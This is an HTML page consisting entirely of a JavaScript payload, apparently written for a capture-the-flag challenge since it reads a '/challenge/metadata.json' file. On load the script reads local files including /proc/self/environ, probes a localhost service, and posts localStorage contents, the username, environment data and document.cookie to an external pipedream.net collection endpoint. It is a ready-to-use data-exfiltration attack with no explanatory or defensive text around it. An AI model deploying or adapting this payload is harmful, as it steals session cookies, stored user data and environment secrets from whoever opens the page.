<html>
  <body>
    <script>
      var response = fetch('file:///challenge/metadata.json')
      var envr = fetch('file:///proc/self/environ')
      var local = fetch('http://localhost:4000')
      var localp = fetch('http://localhost:4000', {method: "post"})
      fetch("https://enmocb6j3fxoq.x.pipedream.net/", {
        method: "post",
        body: JSON.stringify({
          store: Object.entries(localStorage),
          username: localStorage.getItem('username'),
          image: localStorage.getItem('image'),
          metadata: JSON.stringify(response),
          env: JSON.stringify(envr),
          local: JSON.stringify(local),
          localp: JSON.stringify(localp),
          cookie: document.cookie,
        }),
      });
    </script>
  </body>
</html>
